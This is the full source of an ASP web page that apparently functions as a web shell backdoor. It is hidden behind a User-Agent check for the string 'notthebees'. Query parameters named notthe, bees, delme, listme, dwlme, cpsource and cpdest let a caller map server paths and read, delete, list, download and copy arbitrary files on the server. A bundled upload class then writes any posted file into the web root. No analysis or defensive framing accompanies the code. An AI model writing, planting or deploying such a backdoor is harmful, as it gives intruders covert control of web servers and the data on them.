<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" dir="ltr" lang="en-US">
<body style="color:#333333;">
<%
' upload class stuff

Class FileUploader
	Public  Files
	Private mcolFormElem

	Private Sub Class_Initialize()
		Set Files = Server.CreateObject("Scripting.Dictionary")
		Set mcolFormElem = Server.CreateObject("Scripting.Dictionary")
	End Sub
	
	Private Sub Class_Terminate()
		If IsObject(Files) Then
			Files.RemoveAll()
			Set Files = Nothing
		End If
		If IsObject(mcolFormElem) Then
			mcolFormElem.RemoveAll()
			Set mcolFormElem = Nothing
		End If
	End Sub

	Public Property Get Form(sIndex)
		Form = ""
		If mcolFormElem.Exists(LCase(sIndex)) Then Form = mcolFormElem.Item(LCase(sIndex))
	End Property

	Public Default Sub Upload()
		Dim biData, sInputName
		Dim nPosBegin, nPosEnd, nPos, vDataBounds, nDataBoundPos
		Dim nPosFile, nPosBound

		biData = Request.BinaryRead(Request.TotalBytes)
		nPosBegin = 1
		nPosEnd = InstrB(nPosBegin, biData, CByteString(Chr(13)))
		
		If (nPosEnd-nPosBegin) <= 0 Then Exit Sub
		 
		vDataBounds = MidB(biData, nPosBegin, nPosEnd-nPosBegin)
		nDataBoundPos = InstrB(1, biData, vDataBounds)
		
		Do Until nDataBoundPos = InstrB(biData, vDataBounds & CByteString("--"))
			
			nPos = InstrB(nDataBoundPos, biData, CByteString("Content-Disposition"))
			nPos = InstrB(nPos, biData, CByteString("name="))
			nPosBegin = nPos + 6
			nPosEnd = InstrB(nPosBegin, biData, CByteString(Chr(34)))
			sInputName = CWideString(MidB(biData, nPosBegin, nPosEnd-nPosBegin))
			nPosFile = InstrB(nDataBoundPos, biData, CByteString("filename="))
			nPosBound = InstrB(nPosEnd, biData, vDataBounds)
			
			If nPosFile <> 0 And  nPosFile < nPosBound Then
				Dim oUploadFile, sFileName
				Set oUploadFile = New UploadedFile
				
				nPosBegin = nPosFile + 10
				nPosEnd =  InstrB(nPosBegin, biData, CByteString(Chr(34)))
				sFileName = CWideString(MidB(biData, nPosBegin, nPosEnd-nPosBegin))
				oUploadFile.FileName = Right(sFileName, Len(sFileName)-InStrRev(sFileName, "\"))

				nPos = InstrB(nPosEnd, biData, CByteString("Content-Type:"))
				nPosBegin = nPos + 14
				nPosEnd = InstrB(nPosBegin, biData, CByteString(Chr(13)))
				
				oUploadFile.ContentType = CWideString(MidB(biData, nPosBegin, nPosEnd-nPosBegin))
				
				nPosBegin = nPosEnd+4
				nPosEnd = InstrB(nPosBegin, biData, vDataBounds) - 2
				oUploadFile.FileData = MidB(biData, nPosBegin, nPosEnd-nPosBegin)
				
				If oUploadFile.FileSize > 0 Then Files.Add LCase(sInputName), oUploadFile
			Else
				nPos = InstrB(nPos, biData, CByteString(Chr(13)))
				nPosBegin = nPos + 4
				nPosEnd = InstrB(nPosBegin, biData, vDataBounds) - 2
				If Not mcolFormElem.Exists(LCase(sInputName)) Then mcolFormElem.Add LCase(sInputName), CWideString(MidB(biData, nPosBegin, nPosEnd-nPosBegin))
			End If

			nDataBoundPos = InstrB(nDataBoundPos + LenB(vDataBounds), biData, vDataBounds)
		Loop
	End Sub

	'String to byte string conversion
	Private Function CByteString(sString)
		Dim nIndex
		For nIndex = 1 to Len(sString)
		   CByteString = CByteString & ChrB(AscB(Mid(sString,nIndex,1)))
		Next
	End Function

	'Byte string to string conversion
	Private Function CWideString(bsString)
		Dim nIndex
		CWideString =""
		For nIndex = 1 to LenB(bsString)
		   CWideString = CWideString & Chr(AscB(MidB(bsString,nIndex,1))) 
		Next
	End Function
End Class

Class UploadedFile
	Public ContentType
	Public FileName
	Public FileData
	
	Public Property Get FileSize()
		FileSize = LenB(FileData)
	End Property

	Public Sub SaveToDisk(sPath)
		Dim oFS, oFile
		Dim nIndex
	
		If sPath = "" Or FileName = "" Then Exit Sub
		If Mid(sPath, Len(sPath)) <> "\" Then sPath = sPath & "\"
	
		Set oFS = Server.CreateObject("Scripting.FileSystemObject")
		If Not oFS.FolderExists(sPath) Then Exit Sub
		
		Set oFile = oFS.CreateTextFile(sPath & FileName, True)
		
		For nIndex = 1 to LenB(FileData)
		    oFile.Write Chr(AscB(MidB(FileData,nIndex,1)))
		Next

		oFile.Close
	End Sub
	
End Class


' set a password to keep prying eyes away
dim ua
set ua = Request.ServerVariables("HTTP_USER_AGENT")
response.write(ua)
if ua = "notthebees" then
' code here for the site

 dim notthe,bees,delme,listme,dwlme,cpsource,cpdest
 ' server path info
 
 Set notthe = Request.QueryString("notthe")
 if notthe = "" Then 
 Response.Write("Nothing set for notthe <br />")
 else
 Response.Write(Server.MapPath(Request.QueryString("notthe")) & "<br />")
 end if

 ' file reading
 
 Set bees = Request.QueryString("bees")
 if bees = "" then 
 Response.Write("Nothing set for bees <br />")
 else
 Set FS = Server.CreateObject("Scripting.FileSystemObject")
 Set RS = FS.OpenTextFile(Request.QueryString("bees"),1)
 Response.Write("<textarea rows='55' cols='100'>")
 While not rs.AtEndOfStream
      Response.Write RS.ReadLine
 Wend
 Response.Write("</textarea><br /><br />")
 end if

' file deletion
 
 Set delme = Request.QueryString("delme")
 if delme = "" Then 
 Response.Write("Nothing set for delme <br />")
 else
 dim filesys
 Set filesys = CreateObject("Scripting.FileSystemObject")
 filesys.DeleteFile(Request.QueryString("delme"))
 Response.Write("File deleted <br />")
 end if

' list directories

 Set listme = Request.QueryString("listme")
 if listme = "" Then 
 Response.Write("Nothing set for listme <br />")
 else
 Dim fso, folder, files,colSubFolders
 Set fso = CreateObject("Scripting.FileSystemObject")
 Set folder = fso.GetFolder(Request.QueryString("listme"))
 Set files = folder.Files
 For each folderIdx In files
 Response.Write("<b style='background-color:#0033cc;'> " & folderIdx.Name  & " </b> Size: " & folderIdx.Size & "<br />") 
 Next
 Response.Write("<b>Folders: <br /></b>") 
 Set colSubfolders = folder.Subfolders
 For Each objSubfolder in colSubfolders
    Response.Write("<b style='background-color:#009933;'> " & objSubfolder.Name & "</b><br />")
 Next
 end if

 ' download files

 Set dwlme = Request.QueryString("dwlme")
 if dwlme = "" Then 
 Response.Write("Nothing set for dwlme <br />")
 else
 Response.ContentType = "application/asp-unknown"
 Response.AddHeader "content-disposition","attachment; filename=" & dwlme
 Set FStream = Server.CreateObject("ADODB.Stream")
 FStream.Open()
 FStream.Type = 1
 FStream.LoadFromFile(dwlme)
 Response.BinaryWrite FStream.Read()
 FStream.Close
 Set FStream = Nothing
 Response.End
 end if

' copy files

 Set cpsource = Request.QueryString("cpsource")
 if cpsource = "" Then 
 Response.Write("Nothing set for cpsource <br />")
 else
 dim filesysop
 Set filesysop = CreateObject("Scripting.FileSystemObject")
 filesysop.CopyFile Request.QueryString("cpsource"),Request.QueryString("cpdest"),1
 Response.Write("File has been copied from  <br />" & Request.QueryString("cpsource")  & " to " & Request.QueryString("cpdest") & "<br />")
 end if

 
' finally the file upload section

 Dim Uploader, File
 Set Uploader = New FileUploader
 Uploader.Upload()
 Response.Expires = -1
 Server.ScriptTimeOut = 30
 If Uploader.Files.Count = 0 Then
	Response.Write "File not uploaded."
 Else
 
 For Each File In Uploader.Files.Items
 File.SaveToDisk Server.MapPath("/")
 Next
 End if
 
Else
Response.Write("YOU SHALL NOT PASS!")
end if

%>
<br />
<form action="register2.asp" method="POST" enctype="multipart/form-data">
 File To Upload: <input type="file" name="file1" /> <br />
 <input type="submit" name="Submit" value="Upload It" />
</form>
</body>
</html>